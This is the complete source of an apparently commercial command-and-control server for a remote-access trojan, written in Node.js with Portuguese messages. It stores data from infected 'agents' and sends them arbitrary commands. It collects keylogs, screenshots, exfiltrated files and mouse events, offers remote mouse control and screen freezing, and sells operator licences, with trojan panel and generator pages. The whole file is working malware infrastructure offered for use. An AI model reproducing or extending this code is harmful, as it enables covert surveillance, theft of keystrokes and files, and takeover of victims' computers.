const express = require("express");
const Database = require("better-sqlite3");
const bcrypt = require("bcrypt");
const cors = require("cors");
const WebSocket = require("ws");
const http = require("http");
const path = require("path");
const fs = require("fs");
const os = require("os");

const app = express();
const PORT = process.env.PORT || 3000;

// ============================================================
// MIDDLEWARES
// ============================================================
app.use(cors());
app.use(express.json({ limit: "100mb" }));
app.use(express.static("public"));

// ============================================================
// SERVIDOR HTTP + WEBSOCKET
// ============================================================
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// ============================================================
// DATABASE
// ============================================================
const db = new Database("database.db");

// ============================================================
// FUNÇÃO PARA PEGAR IP AUTOMATICAMENTE
// ============================================================
function getLocalIP() {
    const interfaces = os.networkInterfaces();
    for (let name of Object.keys(interfaces)) {
        for (let iface of interfaces[name]) {
            if (iface.family === 'IPv4' && !iface.internal) {
                return iface.address;
            }
        }
    }
    return '127.0.0.1';
}

function getPublicIP() {
    try {
        const https = require('https');
        return new Promise((resolve) => {
            https.get('https://api.ipify.org', (res) => {
                let data = '';
                res.on('data', (chunk) => data += chunk);
                res.on('end', () => resolve(data));
            }).on('error', () => resolve(getLocalIP()));
        });
    } catch {
        return getLocalIP();
    }
}

// ============================================================
// INICIAR TABELAS DO BANCO DE DADOS
// ============================================================
db.prepare(`
CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT NOT NULL,
    email TEXT UNIQUE NOT NULL,
    password TEXT NOT NULL,
    is_admin INTEGER DEFAULT 0,
    is_paid INTEGER DEFAULT 0,
    expires_at INTEGER,
    api_key TEXT,
    created_at INTEGER DEFAULT (strftime('%s', 'now'))
)
`).run();

db.prepare(`
CREATE TABLE IF NOT EXISTS agents (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER NOT NULL,
    agent_id TEXT UNIQUE NOT NULL,
    hostname TEXT,
    os TEXT,
    ip TEXT,
    country TEXT,
    last_seen INTEGER,
    first_seen INTEGER,
    status TEXT DEFAULT 'online',
    frozen INTEGER DEFAULT 0,
    controlled INTEGER DEFAULT 0,
    FOREIGN KEY (user_id) REFERENCES users(id)
)
`).run();

db.prepare(`
CREATE TABLE IF NOT EXISTS commands (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    agent_id TEXT NOT NULL,
    command TEXT NOT NULL,
    result TEXT,
    status TEXT DEFAULT 'pending',
    created_at INTEGER DEFAULT (strftime('%s', 'now')),
    executed_at INTEGER
)
`).run();

db.prepare(`
CREATE TABLE IF NOT EXISTS keylogs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    agent_id TEXT NOT NULL,
    data TEXT NOT NULL,
    created_at INTEGER DEFAULT (strftime('%s', 'now'))
)
`).run();

db.prepare(`
CREATE TABLE IF NOT EXISTS screenshots (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    agent_id TEXT NOT NULL,
    image_data TEXT,
    created_at INTEGER DEFAULT (strftime('%s', 'now'))
)
`).run();

db.prepare(`
CREATE TABLE IF NOT EXISTS files (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    agent_id TEXT NOT NULL,
    file_name TEXT,
    file_data TEXT,
    created_at INTEGER DEFAULT (strftime('%s', 'now'))
)
`).run();

db.prepare(`
CREATE TABLE IF NOT EXISTS mouse_events (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    agent_id TEXT NOT NULL,
    event_type TEXT,
    x INTEGER,
    y INTEGER,
    created_at INTEGER DEFAULT (strftime('%s', 'now'))
)
`).run();

// ============================================================
// WEBSOCKET CONNECTIONS
// ============================================================
const agents = new Map();
const userAgents = new Map();

wss.on("connection", (ws, req) => {
    console.log("🟢 Nova conexão WebSocket");
    let authenticated = false;
    let currentAgentId = null;
    let currentUserId = null;
    
    ws.on("message", async (data) => {
        try {
            const message = JSON.parse(data.toString());
            
            // ====================================================
            // AUTENTICAÇÃO DO AGENT
            // ====================================================
            if (message.type === "auth_agent") {
                const { agent_id, api_key, hostname, os, ip } = message;
                
                const user = db.prepare(`
                    SELECT id, is_paid, expires_at, is_admin
                    FROM users 
                    WHERE api_key = ? AND (is_paid = 1 OR is_admin = 1)
                `).get(api_key);
                
                if (!user) {
                    ws.send(JSON.stringify({ type: "auth_failed", reason: "Invalid credentials" }));
                    ws.close();
                    return;
                }
                
                if (user.expires_at && user.expires_at < Date.now() && user.is_admin !== 1) {
                    ws.send(JSON.stringify({ type: "auth_failed", reason: "License expired" }));
                    ws.close();
                    return;
                }
                
                authenticated = true;
                currentAgentId = agent_id;
                currentUserId = user.id;
                
                const existing = db.prepare("SELECT * FROM agents WHERE agent_id = ?").get(agent_id);
                
                if (!existing) {
                    db.prepare(`
                        INSERT INTO agents (user_id, agent_id, hostname, os, ip, first_seen, last_seen, frozen, controlled)
                        VALUES (?, ?, ?, ?, ?, ?, ?, 0, 0)
                    `).run(user.id, agent_id, hostname, os, ip, Date.now(), Date.now());
                } else {
                    db.prepare(`
                        UPDATE agents SET last_seen = ?, status = 'online', ip = ?, hostname = ?, os = ?
                        WHERE agent_id = ?
                    `).run(Date.now(), ip, hostname, os, agent_id);
                }
                
                agents.set(agent_id, ws);
                
                if (!userAgents.has(user.id)) {
                    userAgents.set(user.id, new Set());
                }
                userAgents.get(user.id).add(agent_id);
                
                ws.send(JSON.stringify({ type: "auth_success", message: "Connected to C2" }));
                
                const pendingCommands = db.prepare(`
                    SELECT id, command FROM commands 
                    WHERE agent_id = ? AND status = 'pending'
                `).all(agent_id);
                
                for (const cmd of pendingCommands) {
                    ws.send(JSON.stringify({ type: "command", id: cmd.id, command: cmd.command }));
                }
                
                console.log(`✅ Agent conectado: ${agent_id}`);
            }
            
            // ====================================================
            // RESPOSTA DE COMANDO
            // ====================================================
            else if (message.type === "command_result" && authenticated) {
                const { command_id, result } = message;
                db.prepare(`
                    UPDATE commands 
                    SET result = ?, status = 'completed', executed_at = ?
                    WHERE id = ?
                `).run(result, Date.now(), command_id);
                
                broadcastToUser(currentUserId, {
                    type: "command_completed",
                    agent_id: currentAgentId,
                    command_id: command_id,
                    result: result
                });
            }
            
            // ====================================================
            // KEYLOG DATA
            // ====================================================
            else if (message.type === "keylog_data" && authenticated) {
                const { data } = message;
                db.prepare(`INSERT INTO keylogs (agent_id, data) VALUES (?, ?)`).run(currentAgentId, data);
                broadcastToUser(currentUserId, {
                    type: "new_keylog",
                    agent_id: currentAgentId,
                    data: data
                });
            }
            
            // ====================================================
            // SCREENSHOT DATA
            // ====================================================
            else if (message.type === "screenshot_data" && authenticated) {
                const { image_data } = message;
                db.prepare(`INSERT INTO screenshots (agent_id, image_data) VALUES (?, ?)`).run(currentAgentId, image_data);
                broadcastToUser(currentUserId, {
                    type: "new_screenshot",
                    agent_id: currentAgentId,
                    image_data: image_data
                });
            }
            
            // ====================================================
            // FILE DATA
            // ====================================================
            else if (message.type === "file_data" && authenticated) {
                const { file_name, file_data } = message;
                db.prepare(`INSERT INTO files (agent_id, file_name, file_data) VALUES (?, ?, ?)`).run(currentAgentId, file_name, file_data);
            }
            
            // ====================================================
            // MOUSE EVENT
            // ====================================================
            else if (message.type === "mouse_event" && authenticated) {
                const { event_type, x, y } = message;
                db.prepare(`INSERT INTO mouse_events (agent_id, event_type, x, y) VALUES (?, ?, ?, ?)`).run(currentAgentId, event_type, x, y);
            }
            
            // ====================================================
            // HEARTBEAT
            // ====================================================
            else if (message.type === "heartbeat" && authenticated) {
                db.prepare("UPDATE agents SET last_seen = ? WHERE agent_id = ?").run(Date.now(), currentAgentId);
                ws.send(JSON.stringify({ type: "heartbeat_ack" }));
            }
            
        } catch (err) {
            console.error("WebSocket error:", err);
        }
    });
    
    ws.on("close", () => {
        if (currentAgentId) {
            console.log(`🔴 Agent desconectado: ${currentAgentId}`);
            db.prepare("UPDATE agents SET status = 'offline' WHERE agent_id = ?").run(currentAgentId);
            agents.delete(currentAgentId);
            if (currentUserId && userAgents.has(currentUserId)) {
                userAgents.get(currentUserId).delete(currentAgentId);
            }
        }
    });
});

function broadcastToUser(userId, message) {
    if (!userAgents.has(userId)) return;
    for (const agentId of userAgents.get(userId)) {
        const ws = agents.get(agentId);
        if (ws && ws.readyState === WebSocket.OPEN) {
            ws.send(JSON.stringify(message));
        }
    }
}

// ============================================================
// API ROUTES
// ============================================================

app.get("/api/myip", async (req, res) => {
    const localIP = getLocalIP();
    const publicIP = await getPublicIP();
    res.json({ localIP, publicIP });
});

app.post("/api/generate_key", async (req, res) => {
    const { email, password } = req.body;
    const user = db.prepare("SELECT * FROM users WHERE email = ?").get(email);
    if (!user) return res.status(404).json({ error: "User not found" });
    const valid = await bcrypt.compare(password, user.password);
    if (!valid) return res.status(401).json({ error: "Invalid password" });
    const api_key = require("crypto").randomBytes(32).toString("hex");
    db.prepare("UPDATE users SET api_key = ? WHERE id = ?").run(api_key, user.id);
    res.json({ api_key });
});

app.get("/api/agents", (req, res) => {
    const { email, api_key } = req.headers;
    const user = db.prepare("SELECT id FROM users WHERE email = ? AND api_key = ?").get(email, api_key);
    if (!user) return res.status(401).json({ error: "Unauthorized" });
    const agentsList = db.prepare(`SELECT agent_id, hostname, os, ip, last_seen, status, frozen, controlled FROM agents WHERE user_id = ?`).all(user.id);
    res.json(agentsList);
});

app.post("/api/send_command", (req, res) => {
    const { email, api_key, agent_id, command } = req.body;
    const user = db.prepare("SELECT id FROM users WHERE email = ? AND api_key = ?").get(email, api_key);
    if (!user) return res.status(401).json({ error: "Unauthorized" });
    const agent = db.prepare("SELECT * FROM agents WHERE agent_id = ? AND user_id = ?").get(agent_id, user.id);
    if (!agent) return res.status(404).json({ error: "Agent not found" });
    const result = db.prepare(`INSERT INTO commands (agent_id, command) VALUES (?, ?)`).run(agent_id, command);
    const ws = agents.get(agent_id);
    if (ws && ws.readyState === WebSocket.OPEN) {
        ws.send(JSON.stringify({ type: "command", id: result.lastInsertRowid, command: command }));
    }
    res.json({ id: result.lastInsertRowid, status: "sent" });
});

app.post("/api/freeze_screen", (req, res) => {
    const { email, api_key, agent_id, frozen } = req.body;
    const user = db.prepare("SELECT id FROM users WHERE email = ? AND api_key = ?").get(email, api_key);
    if (!user) return res.status(401).json({ error: "Unauthorized" });
    db.prepare("UPDATE agents SET frozen = ? WHERE agent_id = ?").run(frozen ? 1 : 0, agent_id);
    const ws = agents.get(agent_id);
    if (ws && ws.readyState === WebSocket.OPEN) {
        ws.send(JSON.stringify({ type: "freeze_screen", frozen: frozen }));
    }
    res.json({ success: true, frozen: frozen });
});

app.post("/api/set_control", (req, res) => {
    const { email, api_key, agent_id, controlled } = req.body;
    const user = db.prepare("SELECT id FROM users WHERE email = ? AND api_key = ?").get(email, api_key);
    if (!user) return res.status(401).json({ error: "Unauthorized" });
    db.prepare("UPDATE agents SET controlled = ? WHERE agent_id = ?").run(controlled ? 1 : 0, agent_id);
    const ws = agents.get(agent_id);
    if (ws && ws.readyState === WebSocket.OPEN) {
        ws.send(JSON.stringify({ type: "set_control", controlled: controlled }));
    }
    res.json({ success: true, controlled: controlled });
});

app.post("/api/send_mouse", (req, res) => {
    const { email, api_key, agent_id, x, y, button } = req.body;
    const user = db.prepare("SELECT id FROM users WHERE email = ? AND api_key = ?").get(email, api_key);
    if (!user) return res.status(401).json({ error: "Unauthorized" });
    const ws = agents.get(agent_id);
    if (ws && ws.readyState === WebSocket.OPEN) {
        ws.send(JSON.stringify({ type: "mouse_control", x: x, y: y, button: button }));
    }
    res.json({ success: true });
});

app.get("/api/get_commands", (req, res) => {
    const { agent_id } = req.query;
    const commands = db.prepare(`SELECT id, command, result, status, created_at FROM commands WHERE agent_id = ? AND status = 'completed' ORDER BY created_at DESC LIMIT 50`).all(agent_id);
    res.json(commands);
});

app.get("/api/get_keylogs", (req, res) => {
    const { agent_id, limit = 100 } = req.query;
    const keylogs = db.prepare(`SELECT data, created_at FROM keylogs WHERE agent_id = ? ORDER BY created_at DESC LIMIT ?`).all(agent_id, limit);
    res.json(keylogs);
});

app.get("/api/get_screenshots", (req, res) => {
    const { agent_id, limit = 10 } = req.query;
    const screenshots = db.prepare(`SELECT image_data, created_at FROM screenshots WHERE agent_id = ? ORDER BY created_at DESC LIMIT ?`).all(agent_id, limit);
    res.json(screenshots);
});

// ============================================================
// AUTH ROUTES
// ============================================================

app.post("/register", async (req, res) => {
    const { username, email, password } = req.body;
    if (!username || !email || !password) {
        return res.status(400).json({ error: "Preencha todos os campos" });
    }
    try {
        const hash = await bcrypt.hash(password, 10);
        const api_key = require("crypto").randomBytes(32).toString("hex");
        const result = db.prepare(`INSERT INTO users (username, email, password, api_key) VALUES (?, ?, ?, ?)`).run(username, email, hash, api_key);
        res.json({ message: "Conta criada com sucesso!", userId: result.lastInsertRowid, api_key });
    } catch (err) {
        if (err.code === "SQLITE_CONSTRAINT_UNIQUE") {
            return res.status(400).json({ error: "Email já cadastrado" });
        }
        console.error(err);
        res.status(500).json({ error: "Erro no servidor" });
    }
});

app.post("/login", async (req, res) => {
    const { email, password } = req.body;
    if (!email || !password) {
        return res.status(400).json({ error: "Preencha todos os campos" });
    }
    try {
        const user = db.prepare(`SELECT * FROM users WHERE email = ? OR username = ?`).get(email, email);
        if (!user) return res.status(400).json({ error: "Usuário não encontrado" });
        const validPassword = await bcrypt.compare(password, user.password);
        if (!validPassword) return res.status(400).json({ error: "Senha incorreta" });
        const now = Date.now();
        const isAdmin = user.is_admin === 1;
        const isActivePaid = user.is_paid === 1 && (!user.expires_at || user.expires_at > now);
        let redirect = "dashboard.html";
        if (isAdmin) redirect = "admin.html";
        else if (isActivePaid) redirect = "trojan_panel.html";
        res.json({
            message: "Login realizado com sucesso!",
            user: {
                id: user.id,
                username: user.username,
                email: user.email,
                is_admin: user.is_admin,
                is_paid: user.is_paid,
                api_key: user.api_key
            },
            redirect
        });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: "Erro no servidor" });
    }
});

app.get("/admin/make", (req, res) => {
    const { email } = req.query;
    if (!email) return res.status(400).send("Email required");
    db.prepare("UPDATE users SET is_admin = 1 WHERE email = ?").run(email);
    res.send(`✅ ${email} agora é admin!`);
});

app.post("/admin/grant", (req, res) => {
    const { email, plan } = req.body;
    let duration = plan === "monthly" ? 30 : plan === "yearly" ? 365 : 0;
    if (!duration) return res.status(400).json({ error: "Invalid plan" });
    const expires_at = Date.now() + (duration * 24 * 60 * 60 * 1000);
    db.prepare(`UPDATE users SET is_paid = 1, expires_at = ? WHERE email = ?`).run(expires_at, email);
    res.json({ message: "Acesso liberado!" });
});

app.get("/admin/users", (req, res) => {
    const users = db.prepare(`SELECT id, username, email, is_paid, is_admin, expires_at, created_at FROM users`).all();
    res.json(users);
});

// ============================================================
// SERVIDOR ESTÁTICO
// ============================================================
app.get("/", (req, res) => res.sendFile(path.join(__dirname, "public", "index.html")));
app.get("/trojan_panel.html", (req, res) => res.sendFile(path.join(__dirname, "public", "trojan_panel.html")));
app.get("/trojan_generator.html", (req, res) => res.sendFile(path.join(__dirname, "public", "trojan_generator.html")));

// ============================================================
// START SERVER
// ============================================================
server.listen(PORT, async () => {
    const localIP = getLocalIP();
    const publicIP = await getPublicIP();
    console.log(`\n╔══════════════════════════════════════════════════════════════╗`);
    console.log(`║              🔥 C2 SERVER ULTIMATE INICIADO 🔥               ║`);
    console.log(`╠══════════════════════════════════════════════════════════════╣`);
    console.log(`║ 📡 WebSocket: ws://${localIP}:${PORT}                               ║`);
    console.log(`║ 🌐 Local:     http://${localIP}:${PORT}                                 ║`);
    console.log(`║ 🌍 Público:   http://${publicIP}:${PORT}                               ║`);
    console.log(`╚══════════════════════════════════════════════════════════════╝`);
});